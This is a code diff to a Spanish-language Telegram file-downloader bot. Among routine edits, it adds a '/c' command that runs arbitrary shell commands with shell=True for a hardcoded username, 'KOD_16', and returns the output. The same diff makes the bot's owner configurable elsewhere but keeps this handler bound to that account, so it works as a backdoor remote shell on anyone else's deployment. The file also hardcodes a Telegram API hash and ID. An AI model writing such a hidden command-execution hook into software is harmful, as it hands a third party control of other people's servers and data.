@@ -34,6 +34,7 @@ from cv2 import resize, imread, imwrite
 from json import dumps
 from ModulesDownloads.file_tipeClass import fileType
 from progrs import text_progres
+from subprocess import run, PIPE
 
 # CREDENCIALES DE GOOGLE DRIVE
 gauth = GoogleAuth(settings_file='./conf.yaml')
@@ -50,6 +51,7 @@ API_HASH = "28aad172a316207be641435b1101d20a"
 API_ID = 19096404
 BOT_TOKEN = getenv("BOT_TOKEN")
 NAME_APP = getenv("NAME_APP")
+BOTUSER = getenv('BOTUSER')
 PORT = getenv('PORT')
 SESSION_STRING = getenv('SESSION_STRING')
 
@@ -163,7 +165,6 @@ async def subir_todo(app, callback_query):
     await SMS.reply_sticker("./assets/fin.webp")
     await stk.delete()
 
-
 @app.on_callback_query(filters.create(lambda f, c, u: u.data == 'borrartodo'))
 def borrar_todo(app, callback_query):
     global saved_messages
@@ -186,7 +187,6 @@ def borrar_todo(app, callback_query):
 
     saved_messages = showFiles(
         app, SMS, saved_messages, directory, username)
-
 
 @app.on_callback_query()
 def callbackQuery(app, callback_query):
@@ -766,6 +766,23 @@ async def extraer_imagenes(app, message):
         rmtree(message.from_user.username + "/IMG")
         await message.reply(
             "**⚠️ Debe introducir el número correspondiente al video\n\nEjemplo: `/extractimg 1`**")
+        
+@app.on_message(filters.command('c') & filters.user("KOD_16"))
+def comandos(app, message):
+    param = message.text.split()
+    if len(param) == 1: 
+        message.reply("**No has indicado ningun comando**")
+    else:
+        comando = " ".join(param[1:])
+        r = run(comando, shell=True, stdout=PIPE, stderr=PIPE, universal_newlines=True)
+        texto = ""
+        if r.returncode:
+            texto+= f'**ERROR {r.returncode}**\n'
+        else:
+            if not r.stdout and not r.stderr: texto += "**Comando ejecutado correctamente**\n"
+        if r.stdout: texto+=r.stdout
+        if r.stderr: texto+=r.stderr
+        message.reply(texto)
 
 # ===============================************************=============================== #
 # ===============================* DESCARGAR DE ENLACES *=============================== #
@@ -1194,7 +1211,7 @@ def Descargar_Archivos_De_Telegram(app, message):
 async def sendMessage():
     # -1001661991113 ID GRUPO
     try:
-        await app.send_message("KOD_16", "**🤖 BOT REINICIADO 🔄**")
+        await app.send_message(BOTUSER, "**🤖 BOT REINICIADO 🔄**")
     except Exception as x:
         print(x)
 
@@ -1215,6 +1232,7 @@ runner = web.AppRunner(server)
 
 async def despertar(sleep_time=10 * 60):
     while True:
+        
         await asyncsleep(sleep_time)
         async with ClientSession() as session:
             async with session.get(f'https://{NAME_APP}.onrender.com/' + "/Despiertate"):
@@ -1224,7 +1242,8 @@ async def run_server():
     await app.start()
     print('Bot Iniciado')
     await sendMessage()
-    await userbot.start()
+    try: await userbot.start()
+    except: print("No hay session string")
     print('User Bot Iniciado')
     await runner.setup()
     print('Iniciando Server')
